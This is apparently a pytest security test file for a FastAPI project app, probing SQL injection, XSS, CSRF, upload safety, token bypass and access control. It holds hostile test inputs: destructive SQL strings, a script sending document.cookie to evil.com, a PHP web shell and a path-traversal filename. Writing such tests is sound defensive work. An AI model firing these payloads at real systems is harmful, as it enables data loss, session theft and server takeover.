"""
安全测试
测试SQL注入防护、XSS防护、CSRF防护、文件上传安全、认证绕过和权限提升
使用pytest进行测试
"""

import pytest
import uuid
from datetime import datetime
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

# 导入应用和模型
from app.main import app
from app.database import Base, get_db
from app.models import User, Project, DocumentFile
from app.utils.security import get_password_hash, create_access_token


# 创建测试数据库
SQLALCHEMY_DATABASE_URL = "sqlite:///:memory:"
engine = create_engine(
    SQLALCHEMY_DATABASE_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


def override_get_db():
    """覆盖数据库依赖，使用测试数据库"""
    try:
        db = TestingSessionLocal()
        yield db
    finally:
        db.close()


app.dependency_overrides[get_db] = override_get_db
client = TestClient(app)


@pytest.fixture(scope="function")
def db():
    """创建测试数据库会话"""
    Base.metadata.create_all(bind=engine)
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()
        Base.metadata.drop_all(bind=engine)


@pytest.fixture
def test_user(db):
    """创建测试用户"""
    user = User(
        id=str(uuid.uuid4()),
        username="testuser",
        email="test@example.com",
        hashed_password=get_password_hash("TestPass123!"),
        is_active=True,
        created_at=datetime.utcnow()
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


@pytest.fixture
def auth_headers(test_user):
    """创建认证请求头"""
    access_token = create_access_token(data={"sub": test_user.username})
    return {"Authorization": f"Bearer {access_token}"}


class TestSQLInjection:
    """测试SQL注入防护"""

    def test_sql_injection_in_login_username(self):
        """
        测试登录用户名SQL注入防护
        验证SQL注入攻击被阻止
        """
        # 尝试SQL注入
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#",
            "' OR '1'='1' /*",
        ]

        for payload in injection_payloads:
            login_data = {
                "username": payload,
                "password": "any_password"
            }
            response = client.post("/api/v1/auth/login", data=login_data)
            # 应该返回401，而不是成功登录
            assert response.status_code == 401, f"SQL注入攻击应该被阻止: {payload}"

    def test_sql_injection_in_search_query(self, auth_headers):
        """
        测试搜索查询SQL注入防护
        验证搜索参数中的SQL注入被阻止
        """
        injection_payloads = [
            "' OR '1'='1",
            "test' UNION SELECT * FROM users --",
            "'; DELETE FROM projects; --",
        ]

        for payload in injection_payloads:
            response = client.get(f"/api/v1/projects?search={payload}", headers=auth_headers)
            # 应该正常处理，不抛出SQL错误
            assert response.status_code in [200, 422], f"搜索SQL注入应该被安全处理: {payload}"

    def test_sql_injection_in_project_name(self, auth_headers):
        """
        测试项目名称SQL注入防护
        验证项目名称中的SQL注入被阻止
        """
        injection_payloads = [
            "项目'; DROP TABLE projects; --",
            "test' OR '1'='1",
        ]

        for payload in injection_payloads:
            project_data = {
                "name": payload,
                "description": "测试描述"
            }
            response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
            # 应该成功创建项目（SQL注入被转义）或返回400错误
            assert response.status_code in [201, 400, 422], f"项目名称SQL注入应该被安全处理: {payload}"

    def test_sql_injection_in_url_parameters(self, auth_headers):
        """
        测试URL参数SQL注入防护
        验证URL参数中的SQL注入被阻止
        """
        injection_ids = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1 UNION SELECT * FROM users",
        ]

        for injection_id in injection_ids:
            response = client.get(f"/api/v1/projects/{injection_id}", headers=auth_headers)
            # 应该返回404或400，不执行注入的SQL
            assert response.status_code in [404, 400, 422], f"URL参数SQL注入应该被阻止: {injection_id}"


class TestXSSProtection:
    """测试XSS防护"""

    def test_xss_in_project_name(self, auth_headers):
        """
        测试项目名称XSS防护
        验证项目名称中的XSS脚本被转义
        """
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<body onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(1)'>",
            "<svg onload=alert('xss')>",
        ]

        for payload in xss_payloads:
            project_data = {
                "name": payload,
                "description": "测试描述"
            }
            response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
            
            if response.status_code == 201:
                # 验证返回的数据中XSS被转义
                data = response.json()
                assert "<script>" not in data.get("name", ""), f"XSS脚本应该被转义: {payload}"
                assert "alert(" not in data.get("name", ""), f"XSS脚本应该被转义: {payload}"

    def test_xss_in_project_description(self, auth_headers):
        """
        测试项目描述XSS防护
        验证项目描述中的XSS脚本被转义
        """
        xss_payload = "<script>document.location='https://evil.com?cookie='+document.cookie</script>"
        
        project_data = {
            "name": "XSS测试项目",
            "description": xss_payload
        }
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        
        if response.status_code == 201:
            data = response.json()
            # 验证XSS被转义
            assert "<script>" not in data.get("description", ""), "描述中的XSS应该被转义"

    def test_xss_in_user_input(self, auth_headers):
        """
        测试用户输入XSS防护
        验证用户输入中的XSS被阻止
        """
        xss_payloads = [
            "<script>alert(1)</script>",
            "<div onmouseover='alert(1)'>hover me</div>",
        ]

        for payload in xss_payloads:
            # 测试考试名称
            exam_data = {
                "name": payload,
                "description": "测试",
                "exam_date": datetime.utcnow().isoformat()
            }
            response = client.post("/api/v1/exams", json=exam_data, headers=auth_headers)
            
            if response.status_code == 201:
                data = response.json()
                assert "<script>" not in data.get("name", ""), f"考试名称XSS应该被转义: {payload}"


class TestCSRFProtection:
    """测试CSRF防护"""

    def test_csrf_token_required(self, auth_headers):
        """
        测试CSRF Token要求
        验证敏感操作需要CSRF Token
        """
        # 尝试不带CSRF Token的请求（如果应用实现了CSRF保护）
        project_data = {
            "name": "CSRF测试项目",
            "description": "测试"
        }
        
        # 正常请求（带认证头）
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        # 根据实现，可能成功或需要CSRF Token
        assert response.status_code in [201, 403]

    def test_cross_origin_request(self):
        """
        测试跨域请求处理
        验证CORS配置正确
        """
        # 测试OPTIONS预检请求
        headers = {
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type,Authorization"
        }
        response = client.options("/api/v1/projects", headers=headers)
        
        # 验证CORS头
        assert "access-control-allow-origin" in response.headers or response.status_code == 200

    def test_referer_check(self, auth_headers):
        """
        测试Referer检查
        验证Referer头的验证
        """
        project_data = {
            "name": "Referer测试项目",
            "description": "测试"
        }
        
        headers = auth_headers.copy()
        headers["Referer"] = "https://evil.com"
        
        response = client.post("/api/v1/projects", json=project_data, headers=headers)
        # 根据实现，可能接受或拒绝
        assert response.status_code in [201, 403]


class TestFileUploadSecurity:
    """测试文件上传安全"""

    def test_upload_executable_file(self, auth_headers):
        """
        测试上传可执行文件
        验证可执行文件上传被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试上传可执行文件
        executable_content = b"MZ" + b"\x00" * 100  # Windows可执行文件头
        files = {
            "file": ("malware.exe", io.BytesIO(executable_content), "application/x-msdownload")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止可执行文件上传
        assert response.status_code in [400, 415], "可执行文件上传应该被阻止"

    def test_upload_script_file(self, auth_headers):
        """
        测试上传脚本文件
        验证脚本文件上传被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试上传PHP脚本
        php_content = b"<?php echo 'malicious'; system($_GET['cmd']); ?>"
        files = {
            "file": ("shell.php", io.BytesIO(php_content), "application/x-php")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止脚本文件上传
        assert response.status_code in [400, 415], "脚本文件上传应该被阻止"

    def test_upload_with_double_extension(self, auth_headers):
        """
        测试双扩展名文件上传
        验证双扩展名攻击被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试双扩展名攻击
        malicious_content = b"<?php echo 'malicious'; ?>"
        files = {
            "file": ("image.jpg.php", io.BytesIO(malicious_content), "image/jpeg")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止双扩展名文件
        assert response.status_code in [400, 415], "双扩展名文件上传应该被阻止"

    def test_upload_large_file(self, auth_headers):
        """
        测试大文件上传限制
        验证大文件上传被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试上传超大文件（100MB）
        large_content = b"x" * (100 * 1024 * 1024)
        files = {
            "file": ("large.pdf", io.BytesIO(large_content), "application/pdf")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止超大文件上传
        assert response.status_code in [400, 413], "超大文件上传应该被阻止"

    def test_upload_path_traversal(self, auth_headers):
        """
        测试路径遍历攻击
        验证路径遍历被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试路径遍历
        normal_content = b"%PDF-1.4 test"
        files = {
            "file": ("../../../etc/passwd", io.BytesIO(normal_content), "application/pdf")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止路径遍历或安全处理文件名
        if response.status_code == 201:
            # 如果允许上传，文件名应该被净化
            data = response.json()
            assert "../" not in data.get("filename", ""), "路径遍历应该被阻止"

    def test_upload_null_byte_injection(self, auth_headers):
        """
        测试空字节注入攻击
        验证空字节注入被阻止
        """
        import io

        # 创建项目
        project_data = {"name": "安全测试项目"}
        response = client.post("/api/v1/projects", json=project_data, headers=auth_headers)
        project_id = response.json()["id"]

        # 尝试空字节注入
        normal_content = b"<?php echo 'malicious'; ?>"
        files = {
            "file": ("image.php\x00.jpg", io.BytesIO(normal_content), "image/jpeg")
        }
        response = client.post(
            f"/api/v1/projects/{project_id}/files",
            files=files,
            headers=auth_headers
        )
        
        # 应该阻止空字节注入
        assert response.status_code in [400, 415], "空字节注入应该被阻止"


class TestAuthenticationBypass:
    """测试认证绕过"""

    def test_access_without_token(self):
        """
        测试无Token访问
        验证无Token时访问受保护资源被阻止
        """
        protected_endpoints = [
            ("GET", "/api/v1/projects"),
            ("POST", "/api/v1/projects"),
            ("GET", "/api/v1/exams"),
            ("GET", "/api/v1/auth/me"),
        ]

        for method, endpoint in protected_endpoints:
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                response = client.post(endpoint, json={})
            
            # 应该返回401未授权
            assert response.status_code == 401, f"{method} {endpoint} 应该需要认证"

    def test_access_with_invalid_token(self):
        """
        测试无效Token访问
        验证无效Token被阻止
        """
        invalid_tokens = [
            "Bearer invalid_token",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "InvalidFormat",
            "",
        ]

        for token in invalid_tokens:
            headers = {"Authorization": token} if token else {}
            response = client.get("/api/v1/projects", headers=headers)
            
            # 应该返回401
            assert response.status_code == 401, f"无效Token应该被拒绝: {token}"

    def test_access_with_expired_token(self):
        """
        测试过期Token访问
        验证过期Token被阻止
        """
        # 创建一个过期的Token
        expired_token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxNTAwMDAwMDAwfQ.invalid"
        
        headers = {"Authorization": expired_token}
        response = client.get("/api/v1/projects", headers=headers)
        
        # 应该返回401
        assert response.status_code == 401, "过期Token应该被拒绝"

    def test_access_with_modified_token(self):
        """
        测试篡改Token访问
        验证被篡改的Token被阻止
        """
        # 创建一个被篡改的Token
        tampered_token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.tampered"
        
        headers = {"Authorization": tampered_token}
        response = client.get("/api/v1/projects", headers=headers)
        
        # 应该返回401
        assert response.status_code == 401, "篡改的Token应该被拒绝"

    def test_brute_force_protection(self):
        """
        测试暴力破解保护
        验证登录速率限制
        """
        login_data = {
            "username": "testuser",
            "password": "wrong_password"
        }
        
        # 快速发送多个登录请求
        responses = []
        for _ in range(10):
            response = client.post("/api/v1/auth/login", data=login_data)
            responses.append(response.status_code)
        
        # 后面的请求应该被限流（429）或继续返回401
        # 至少应该有限流或账户锁定机制
        assert 429 in responses or responses.count(401) == 10, "应该有暴力破解保护机制"


class TestPrivilegeEscalation:
    """测试权限提升"""

    def test_access_other_user_project(self, auth_headers, db):
        """
        测试访问其他用户项目
        验证用户不能访问其他用户的项目
        """
        # 创建另一个用户
        other_user = User(
            id=str(uuid.uuid4()),
            username="otheruser",
            email="other@example.com",
            hashed_password=get_password_hash("OtherPass123!"),
            is_active=True,
            created_at=datetime.utcnow()
        )
        db.add(other_user)
        db.commit()

        # 创建另一个用户的项目
        other_project = Project(
            id=str(uuid.uuid4()),
            name="Other User Project",
            description="Private",
            owner_id=other_user.id,
            created_at=datetime.utcnow()
        )
        db.add(other_project)
        db.commit()

        # 尝试访问其他用户的项目
        response = client.get(f"/api/v1/projects/{other_project.id}", headers=auth_headers)
        
        # 应该返回403禁止访问或404未找到
        assert response.status_code in [403, 404], "不应该能访问其他用户的项目"

    def test_modify_other_user_project(self, auth_headers, db):
        """
        测试修改其他用户项目
        验证用户不能修改其他用户的项目
        """
        # 创建另一个用户
        other_user = User(
            id=str(uuid.uuid4()),
            username="otheruser2",
            email="other2@example.com",
            hashed_password=get_password_hash("OtherPass123!"),
            is_active=True,
            created_at=datetime.utcnow()
        )
        db.add(other_user)
        db.commit()

        # 创建另一个用户的项目
        other_project = Project(
            id=str(uuid.uuid4()),
            name="Other User Project",
            description="Private",
            owner_id=other_user.id,
            created_at=datetime.utcnow()
        )
        db.add(other_project)
        db.commit()

        # 尝试修改其他用户的项目
        update_data = {"name": "Hacked Project"}
        response = client.put(f"/api/v1/projects/{other_project.id}", json=update_data, headers=auth_headers)
        
        # 应该返回403禁止访问
        assert response.status_code in [403, 404], "不应该能修改其他用户的项目"

    def test_delete_other_user_project(self, auth_headers, db):
        """
        测试删除其他用户项目
        验证用户不能删除其他用户的项目
        """
        # 创建另一个用户
        other_user = User(
            id=str(uuid.uuid4()),
            username="otheruser3",
            email="other3@example.com",
            hashed_password=get_password_hash("OtherPass123!"),
            is_active=True,
            created_at=datetime.utcnow()
        )
        db.add(other_user)
        db.commit()

        # 创建另一个用户的项目
        other_project = Project(
            id=str(uuid.uuid4()),
            name="Other User Project",
            description="Private",
            owner_id=other_user.id,
            created_at=datetime.utcnow()
        )
        db.add(other_project)
        db.commit()

        # 尝试删除其他用户的项目
        response = client.delete(f"/api/v1/projects/{other_project.id}", headers=auth_headers)
        
        # 应该返回403禁止访问
        assert response.status_code in [403, 404], "不应该能删除其他用户的项目"

    def test_admin_privilege_escalation(self, auth_headers):
        """
        测试管理员权限提升
        验证普通用户不能获取管理员权限
        """
        # 尝试访问管理员功能
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/settings",
            "/api/v1/admin/logs",
        ]

        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            # 应该返回403禁止访问
            assert response.status_code == 403, f"普通用户不应访问管理员端点: {endpoint}"

    def test_idor_vulnerability(self, auth_headers, db, test_user):
        """
        测试IDOR（不安全的直接对象引用）漏洞
        验证对象引用安全性
        """
        # 创建测试项目
        project = Project(
            id=str(uuid.uuid4()),
            name="Test Project",
            description="Test",
            owner_id=test_user.id,
            created_at=datetime.utcnow()
        )
        db.add(project)
        db.commit()

        # 尝试通过修改ID访问其他资源
        fake_ids = [
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",
            "admin",
            "1",
        ]

        for fake_id in fake_ids:
            response = client.get(f"/api/v1/projects/{fake_id}", headers=auth_headers)
            # 应该返回404或403
            assert response.status_code in [404, 403], f"IDOR尝试应该被阻止: {fake_id}"


class TestInformationDisclosure:
    """测试信息泄露"""

    def test_error_message_leakage(self):
        """
        测试错误消息泄露
        验证错误消息不包含敏感信息
        """
        # 触发错误
        response = client.get("/api/v1/projects")
        
        # 验证错误消息
        if response.status_code == 401:
            response_text = response.text.lower()
            # 错误消息不应包含敏感信息
            assert "password" not in response_text, "错误消息不应包含密码信息"
            assert "secret" not in response_text, "错误消息不应包含密钥信息"
            assert "sql" not in response_text, "错误消息不应包含SQL信息"

    def test_stack_trace_leakage(self):
        """
        测试堆栈跟踪泄露
        验证生产环境不返回堆栈跟踪
        """
        # 访问不存在的端点
        response = client.get("/api/v1/nonexistent-endpoint-that-causes-error")
        
        response_text = response.text.lower()
        # 不应包含堆栈跟踪
        assert "traceback" not in response_text, "不应返回堆栈跟踪"
        assert "file \"" not in response_text, "不应返回文件路径"
        assert "line " not in response_text or response.status_code != 500, "不应返回行号信息"

    def test_sensitive_headers(self):
        """
        测试敏感HTTP头
        验证响应头不包含敏感信息
        """
        response = client.get("/api/v1/projects")
        
        headers = dict(response.headers)
        headers_str = str(headers).lower()
        
        # 响应头不应包含敏感信息
        assert "x-powered-by" not in headers_str or "php" not in headers_str, "不应泄露技术栈"
        assert "server" not in headers or headers.get("server") != "", "Server头应该被配置"


class TestSessionSecurity:
    """测试会话安全"""

    def test_session_fixation_protection(self):
        """
        测试会话固定保护
        验证登录后会话ID改变
        """
        # 这个测试依赖于具体的会话实现
        # 基本思路是验证登录后会话标识符发生变化
        pass

    def test_session_timeout(self):
        """
        测试会话超时
        验证会话过期机制
        """
        # 这个测试依赖于具体的会话实现
        pass

    def test_secure_cookie_flags(self):
        """
        测试安全Cookie标志
        验证Cookie安全标志
        """
        # 登录获取Cookie
        login_data = {
            "username": "testuser",
            "password": "TestPass123!"
        }
        response = client.post("/api/v1/auth/login", data=login_data)
        
        # 检查Cookie安全标志
        # 注意：这取决于具体的实现
        if "set-cookie" in response.headers:
            cookie = response.headers["set-cookie"]
            # 生产环境应该设置这些标志
            # assert "Secure" in cookie, "Cookie应该设置Secure标志"
            # assert "HttpOnly" in cookie, "Cookie应该设置HttpOnly标志"
            # assert "SameSite" in cookie, "Cookie应该设置SameSite标志"
            pass
